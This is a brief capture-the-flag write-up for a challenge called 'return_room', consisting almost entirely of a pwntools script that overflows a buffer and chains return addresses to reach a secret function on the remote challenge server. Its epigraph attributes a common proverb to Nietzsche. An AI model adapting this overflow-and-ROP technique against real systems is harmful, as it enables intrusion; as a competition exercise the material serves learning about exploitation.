# Description
"Der Teufel steckt im Detail", Friedrich Nietzsche
Accès au challenge : `nc ctf.midnightflag.fr 9022`

# Write UP
```python
from pwn import *

elf = ELF('./return_room')

r = remote('ctf.midnightflag.fr', 9022)

buf = "A"*26
buf += p32(elf.sym['setkey2'])
buf += p32(elf.sym['setkey3'])
buf += p32(0x0804901e)
buf += p32(0xffffffff)
buf += p32(elf.sym['setkey1'])

buf += p32(elf.sym['secret_room'])

r.sendline(buf)

r.interactive()
```

# Flag
-
